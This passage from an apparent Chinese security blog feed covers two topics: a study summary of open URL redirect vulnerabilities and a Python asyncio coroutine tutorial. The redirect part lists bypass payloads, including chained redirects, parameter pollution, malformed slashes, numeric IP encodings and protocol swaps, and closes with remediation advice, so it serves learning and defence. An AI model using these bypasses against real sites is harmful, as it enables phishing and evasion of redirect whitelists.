class="line">例如一个存在URL跳转漏洞的位置，在测试的时候一般都喜欢使用www.baidu.com等知名站点去做第三方跳转，但是现在像baidu.com,qq.com这样的可信站点被许多站点默认加在白名单中，所以以这样可信的站点去跳转它并不能触发URL跳转漏洞（这里是网站的正常逻辑）；而别的方式又绕不过，就可以利用下面这个思路：</span><br><span class="line"></span><br><span class="line">1. baidu.com这个域名已经被加在测试站点的白名单中</span><br><span class="line">2. 任意跳转的URL已经被baidu收录</span><br><span class="line">3. site:xxx(任意跳转的URL)</span><br><span class="line">4. 在百度点击相关的站点的时候回利用百度自身的一个302跳转</span><br><span class="line">5. 将百度自身的这个302跳转作为测试站点热任意URL的参数，绕过白名单baidu.com的限制进行任意URL跳转(注意：百度自身的302跳转太长了，可以使用单向压缩函数进行压缩，前提是测试站点能够解析)</span><br><span class="line"></span><br><span class="line">第二种场景：测试站点的白名单限制的比较严格，只允许加在自己域的地址，这时就需要一个测试站点其他域存在任意URL跳转漏洞，才可能利用成功：</span><br><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=eval.com</span><br><span class="line">总结：其实是利用了两次URL跳转</span><br></pre></td></tr></table></figure></li><li><p>POST方式的URL跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. post方式下的影响较小，比如在站点的个人信息处存在头像上传，上传正常的头像，抓包将头像地址修改为恶意第三方地址，放行以后图片是不能正常显示的，这个时候如果有后台管理员的审核安全意识不高，去查看这个不显示的图片，触发恶意URL跳转，可以打到后台管理员信息。利用条件比较苛刻。在XSS也有类似的利用场景。</span><br><span class="line"></span><br><span class="line">2.如果在POST方式中数据只URL跳转参数，那就可以尝试将POST请求转换为GET请求，配合上面的绕过方式利用。（前提是测试网站支持GET传参的方式）</span><br></pre></td></tr></table></figure></li><li><p>HPP参数污染绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=l@lsowl.xyz</span><br><span class="line"></span><br><span class="line">跳转会变成： location:http://https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=@lsowl.xyz</span><br></pre></td></tr></table></figure></li></ol><h3 id="畸形地址绕过"><a href="#畸形地址绕过" class="headerlink" title="畸形地址绕过"></a>畸形地址绕过</h3><blockquote><p>畸形地址由于web站点采用各种各样的语言以及框架，所以绕过的方式显得很诡异。。。</p></blockquote><ol><li><p>通过添加多余的“/”(%2F),然后对%2F二次URL编码绕过网站对.com的分割</p><p><code>https://www.aaa.com/%2Fevil/%252Ecom</code> </p></li><li><p>通过添加4个“/”前缀和“/..”后缀，突破限制(重复特殊字符绕过)</p><p><code>https://www.aaa.com/redirect.php?url=////www.eval.com/..</code></p></li><li><p>特殊字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&quot;, &quot;/&quot;, &quot;\&quot;, &quot;?&quot;, &quot;:&quot;, &quot;@&quot;, &quot;=&quot;, &quot;&amp;&quot;, &quot;.&quot;</span><br></pre></td></tr></table></figure></li><li><p>协议型网站的实例</p><p><code>http://user:pass@testweb.com/path/;help.php?q=abc#lastpage</code></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542522531.03.png" alt></p></li></ol><h3 id="其他绕过思路"><a href="#其他绕过思路" class="headerlink" title="其他绕过思路"></a>其他绕过思路</h3><ol><li>跳转参数是IP，而不是域名</li><li>跳转到IPV6地址，不是IPV4地址</li><li>将要跳转的IP地址用10进制，8进制，16进制表示</li><li>更换协议，使用FTP,gopher</li><li>CRLF注入不能XSS时，转向利用任意URL跳转漏洞</li></ol><h3 id="IP地址计算补充（以本地ping百度返回的IP为例）"><a href="#IP地址计算补充（以本地ping百度返回的IP为例）" class="headerlink" title="IP地址计算补充（以本地ping百度返回的IP为例）"></a>IP地址计算补充（以本地ping百度返回的IP为例）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995163.32.png" alt></h3><h4 id="第一种计算方法（将点分十进制转换为32位二进制）"><a href="#第一种计算方法（将点分十进制转换为32位二进制）" class="headerlink" title="第一种计算方法（将点分十进制转换为32位二进制）"></a>第一种计算方法（将点分十进制转换为32位二进制）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995526.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995608.55.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995618.84.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995629.62.png" alt></h4><h4 id="第二种计算方法"><a href="#第二种计算方法" class="headerlink" title="第二种计算方法"></a>第二种计算方法</h4><p>111 <em> 256 </em> 256 <em> 256 + 13</em> 256 <em> 256 + 100 </em> 256 +92*1 = 1863148636（十进制）</p><h4 id="第三种计算方法（利用mysql中的inet-aton函数）"><a href="#第三种计算方法（利用mysql中的inet-aton函数）" class="headerlink" title="第三种计算方法（利用mysql中的inet_aton函数）"></a>第三种计算方法（利用mysql中的inet_aton函数）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550996163.52.png" alt></h4><h3 id="半自动化测试"><a href="#半自动化测试" class="headerlink" title="半自动化测试"></a>半自动化测试</h3><ul><li>开源的payload地址：<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a></li></ul><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol><li>referer限制<ul><li>确定传递URL参数的引入来源，保证URL的有效性，避免恶意用户自己生成的链接(这里要注意的是，在有些特殊的环境下，URL跳转会带着HTTP referer头，这样就会使得依赖referer头验证的方式失效)</li></ul></li><li>进行token验证<ul><li>保证所有的链接是可信域中的，加入用户不可控的token在服务端进行验证，防止恶意跳转</li></ul></li><li>服务端做好域名白名单或跳转白名单，只对合法的URL进行跳转（常用）</li><li>对请求参数做加密和签名，防止参数被篡改，服务端要能合法正确的解析URL（不常用，多应用在跳转的URL是由后台生产，不是用户在前台输入）</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/94377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/94377</a></p><p><a href="https://blog.csdn.net/change518/article/details/54286473" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/54286473</a></p><p><a href="https://blog.csdn.net/xyx107/article/details/82941842" target="_blank" rel="noopener">https://blog.csdn.net/xyx107/article/details/82941842</a></p><p><a href="https://blog.csdn.net/change518/article/details/53997509" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/53997509</a></p><p><a href="http://www.admintony.com/redict-bypass.html#more" target="_blank" rel="noopener">http://www.admintony.com/redict-bypass.html#more</a></p><p><a href="http://www.luteam.com/?p=211#more-211" target="_blank" rel="noopener">http://www.luteam.com/?p=211#more-211</a> [关于IP计算]</p><p><a href="http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</a> [关于SSRF绕过]</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;URL跳转漏洞学习总结&quot;&gt;&lt;a href=&quot;#URL跳转漏洞学习总结&quot; class=&quot;headerlink&quot; title=&quot;URL跳转漏洞学习总结&quot;&gt;&lt;/a&gt;URL跳转漏洞学习总结&lt;/h2&gt;&lt;h3 id=&quot;相关背景&quot;&gt;&lt;a href=&quot;#相关背景&quot; class=&quot;
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透" scheme="https://www.lsowl.top/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="URL跳转" scheme="https://www.lsowl.top/tags/URL%E8%B7%B3%E8%BD%AC/"/>
    
      <category term="WEB安全" scheme="https://www.lsowl.top/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python协程学习</title>
    <link href="https://www.lsowl.top/2018/11/09/python%E5%8D%8F%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.lsowl.top/2018/11/09/python协程学习/</id>
    <published>2018-11-09T11:18:58.000Z</published>
    <updated>2018-11-10T13:53:41.658Z</updated>
    
    <content type="html"><![CDATA[<h3 id="python学习总结"><a href="#python学习总结" class="headerlink" title="python学习总结"></a>python学习总结</h3><blockquote><p>在编写程序处理一些任务时为了提高效率，我们的程序会从单一的串行运行的方式向多线程或者多进程的方式来转变，这里学习总结通过python协程来提高程序运行的效率。多进程适合于CPU密集型的程序（各种循环处理，计数等等），多线程适合I/O密集型的程序（如文件的读取，网络爬虫等），但是由于python的GIL(全局解释器锁)的存在，I/O密集型的程序，效率并没有很大的提升，尤其是python在多CPU中多线程的应用（原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低），所以python对于I/O密集型的任务使用协程可以有效的提升效率。</p></blockquote><h3 id="相关知识总结"><a href="#相关知识总结" class="headerlink" title="相关知识总结"></a>相关知识总结</h3><h4 id="为什么python多线程比较鸡肋"><a href="#为什么python多线程比较鸡肋" class="headerlink" title="为什么python多线程比较鸡肋"></a>为什么python多线程比较鸡肋</h4><ol><li>在python多线程下，每个线程的执行方式：<ul><li>获取GIL</li><li>执行代码直到sleep或者是python虚拟机将其挂起</li><li>释放GIL</li></ul></li><li>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</li><li>每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)</li></ol><h4 id="多进程是什么，为什么不会像python多线程那样"><a href="#多进程是什么，为什么不会像python多线程那样" class="headerlink" title="多进程是什么，为什么不会像python多线程那样"></a>多进程是什么，为什么不会像python多线程那样</h4><ol><li>多进程就是利用 CPU 的多核优势，在同一时间并行地执行多个任务，可以大大提高执行效率。</li><li>每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)</li><li>python在多核CPU下做并行的效率提升，通用的就是使用多进程，可以有效的提高并行效率</li></ol><h4 id="什么是阻塞"><a href="#什么是阻塞" class="headerlink" title="什么是阻塞"></a>什么是阻塞</h4><ol><li>阻塞状态指陈程序未得到所需要的计算资源时暂时被挂起的，程序在等待某个操作完成的期间无法进行别的操作的状态。</li><li>常见的阻塞形式有：网络 I/O 阻塞、磁盘 I/O 阻塞、用户输入阻塞等。阻塞是无处不在的，包括 CPU 切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。如果是多核 CPU 则正在执行上下文切换操作的核不可被利用。</li></ol><h4 id="什么是非阻塞"><a href="#什么是非阻塞" class="headerlink" title="什么是非阻塞"></a>什么是非阻塞</h4><ol><li>非阻塞状态指在程序等待某个操作的过程中自身不被阻塞，可以继续进行其他的操作。</li><li>非阻塞并不是在任何程序级别、任何情况下都可以存在的。仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li></ol><h4 id="什么是同步"><a href="#什么是同步" class="headerlink" title="什么是同步"></a>什么是同步</h4><ol><li>不同的程序在完成某个任务，在执行过程中需要靠某种通信方式协调一致的模式</li><li>同步意味着有序</li></ol><h4 id="什么时异步"><a href="#什么时异步" class="headerlink" title="什么时异步"></a>什么时异步</h4><ol><li>不同的程序在完成某个任务，在执行过程中无需通信协调完成任务，不相关的程序单元之间可以是异步的。</li><li>异步意味着无序</li></ol><h4 id="什么是协程"><a href="#什么是协程" class="headerlink" title="什么是协程"></a>什么是协程</h4><ol><li>协程，英文叫做 Coroutine，又称微线程，纤程，协程是一种用户态的轻量级线程</li><li>协程自身拥有寄存器上下文和栈。协程在调度切换时，将寄存器和栈保存到其他地方，在切换上下文时恢复到原来保存的寄存器上下文和栈。协程可以保存上一次调用的状态，在每次过程的重载时就是进入了上一次调用的状态。</li><li>协程本质上是个单进程，协程相对于多进程来说，无需线程上下文切换的开销，无需原子操作锁定及同步的开销，编程模型也非常简单。结合上面来看，除去python的GIL全局解释器锁的问题，协程的上下文切换是在一个进程中不用跨进程，这种模式就决定了它的高效性。</li><li>使用协程来实现异步操作，比如在网络爬虫场景下，当一个请求发出后如果有超时的情况，这个时候就不需要一直等待，在这段时间内程序还可以处理许多任务，在请求响应以后切换回来处理，这样可以极大的提升对CPU的利用率，异步协程可以极大的提升我们处理I/O密集型任务的效率。</li></ol><h3 id="python异步协程的用法"><a href="#python异步协程的用法" class="headerlink" title="python异步协程的用法"></a>python异步协程的用法</h3><blockquote><p>python从3.4版本开始引入了协程的概念，是以生成器对象为基础，操作比较繁琐麻烦，在3.5版本引入了在 async/await，是的协程的操作更加简单。这里学习使用python协程中最常用的库 asyncio，这种协程也是基于生成器的，还有一种Gevent，Gevent需要许多第三方库支持。得确保项目中用到其他用到的网络库也必须使用纯Python或者明确说明支持Gevent，由于Gevent直接修改标准库里面大部分的阻塞式系统调用，可能会出现意想不到的问题，所以用asyncio来实现异步协程。</p></blockquote><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><ol><li>event_loop：事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足条件发生的时候，就会调用对应的处理方法。（这里可以理解为一个监听机制）</li><li>coroutine：中文翻译叫协程，在 Python 中常指代为协程对象类型，我们可以将协程对象注册到时间循环中，它会被事件循环调用。我们可以使用 async 关键字来定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。（方便开发者自己调控）</li><li>task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。</li><li>future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别</li><li>async/await 关键字，它是从 Python 3.5 才出现的，专门用于定义协程。其中，async 定义一个协程，await 用来挂起阻塞方法的执行。</li></ol><h4 id="定义协程"><a href="#定义协程" class="headerlink" title="定义协程"></a>定义协程</h4><ol><li><p>只注入简单的coroutine协程对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span>               <span class="comment">#定义一个协程,async定义的协程返回的是一个coroutine协程对象</span></span><br><span class="line">    print(<span class="string">'Number: '</span>,x)</span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine: '</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()     <span class="comment">#创建事件循环loop</span></span><br><span class="line">loop.run_until_complete(coroutine)  <span class="comment">#调用了 loop 对象的 run_until_complete() 方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Coroutine:  &lt;coroutine object execute at <span class="number">0x000001C08233BEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Number:  <span class="number">1</span></span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure></li><li><p>将 coroutine 对象的进一步封装为task对象，它比 coroutine 对象多了运行状态，比如 running、finished 等，可以用这些状态来获取协程对象的执行情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = loop.create_task(coroutine)  <span class="comment">#调用loop.create_task将async定义返回的coroutine对象进一步分装</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop.run_until_complete(task)       <span class="comment">#调用了loop对象的run_until_complete()方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：这里可以看到task对象的状态</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x00000259A21EAEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task: &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure></li><li><p>不借助loop的create_task方法进一步封装task对象，通过asyncio 的 ensure_future() 方法直接定义task对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">task = asyncio.ensure_future(coroutine)   <span class="comment">#直接定义task对象</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：和通过loop.create_task封装的结果一样</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x000002C99E56AEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure></li></ol><h4 id="绑定回调"><a href="#绑定回调" class="headerlink" title="绑定回调"></a>绑定回调</h4><ol><li><p>通过调用 add_done_callback() 为task对象绑定一个回调方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(task)</span>:</span></span><br><span class="line">    print(<span class="string">'Status:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line">coroutine = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">task.add_done_callback(callback)   <span class="comment">#绑定回调函数</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure></li><li><p>不用回调方法，直接在 task 运行完毕之后也可以直接调用 result() 方法获取结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">coroutline  = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutline)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'Task Result:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure></li></ol><h4 id="多任务协程（通过task列表来实现，调用asncio-wait-方法执行）"><a href="#多任务协程（通过task列表来实现，调用asncio-wait-方法执行）" class="headerlink" title="多任务协程（通过task列表来实现，调用asncio.wait()方法执行）"></a>多任务协程（通过task列表来实现，调用asncio.wait()方法执行）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]  <span class="comment">#利用for循环创建5个task</span></span><br><span class="line">print(<span class="string">'Tasks:'</span>,tasks)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))   <span class="comment">#asyncio.wait(tasks)将task列表注入到loop循环事件中</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">    print(<span class="string">'Task Request:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Tasks: [&lt;Task pending coro=&lt;Request() running at D:/python/实战项目/Coroutine6.py:<span class="number">4</span>&gt;&gt;, &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><h4 id="协程实现"><a href="#协程实现" class="headerlink" title="协程实现"></a>协程实现</h4><blockquote><p>以上是对协程基本的定义使用，并没有进行异步处理的操作，这里用flask模拟网络请求有延迟的情况，然后进行挂起，异步的操作。</p></blockquote><ol><li><p>利用flask编写模拟有网络延迟的服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)      <span class="comment">#表示请求这个接口要延时3秒显示结果，模拟延迟的网络</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello!'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(threaded = <span class="keyword">True</span>)  <span class="comment">#threaded = True表示在服务器开启了多线程模式，如果不开启，服务端是单线程模式，如果还是异步I/O请求的方式，依旧要排队等待依次执行。</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1541731526.07.png" alt></p></li><li><p>通过协程的方式来请求生成的模拟服务端页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 